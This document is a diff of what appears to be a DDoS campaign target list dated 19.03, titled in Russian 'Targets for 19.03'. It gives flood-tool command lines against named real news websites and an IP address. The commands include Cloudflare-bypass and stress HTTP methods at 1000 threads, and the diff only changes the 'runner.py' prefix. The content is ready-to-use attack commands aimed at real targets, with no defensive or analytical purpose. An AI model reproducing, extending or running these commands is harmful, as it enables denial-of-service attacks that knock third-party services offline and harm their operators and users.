@@ -3,10 +3,10 @@
 
 # Цели на 19.03
 
-runner.py https://www.politnavigator.news/ http://www.politnavigator.news/ --http-methods cfb -t 1000
+https://www.politnavigator.news/ http://www.politnavigator.news/ --http-methods cfb -t 1000
 
-runner.py https://rusvesna.su/ http://rusvesna.su/ --http-methods cfb -t 1000
+https://rusvesna.su/ http://rusvesna.su/ --http-methods cfb -t 1000
 
-runner.py 95.131.27.119:80 95.131.27.119:443 --http-methods get stress -t 1000
+95.131.27.119:80 95.131.27.119:443 --http-methods get stress -t 1000
 
-runner.py https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb -t 1000
+https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb -t 1000
